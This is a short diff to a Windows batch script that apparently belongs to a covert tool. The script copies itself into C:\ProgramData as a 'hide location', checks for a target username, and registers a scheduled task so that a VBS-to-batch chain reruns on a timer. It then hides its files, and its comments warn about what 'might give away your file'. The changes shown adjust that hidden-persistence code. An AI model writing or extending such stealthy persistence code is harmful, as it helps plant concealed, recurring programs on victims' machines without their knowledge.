@@ -7,6 +7,8 @@ goto remove_this_if_you_agree_to_follow_the_TOS
 :: Path of the hide location - If the path has the user's username, it will not work for those who have a space. Task Scheduler doesn't support that. This is part of the recurring method.
 set "vpath=C:\ProgramData"
 
+cd %vpath%
+
 :: If using onlogin on task scheduler use this - Might give away your file though - You don't need administrator for anything else currently.
 goto skipadministrator
 if not "%~dp0"=="%vpath%\" (
@@ -351,7 +353,7 @@ IF "%USERNAME%"=="%targetusername%" (
 :skipupdateconfig
 
 :: Make a scheduled task so the VBS -> Batch be ran every X 
->NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr %vpath%\%vname%
+2>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr %vpath%\%vname%
 if errorlevel 0 (set "recurring=true, %when%") else (set "recurring=failed, %when%, is probably incorrect.")
 
 :: Hide batch & VBS
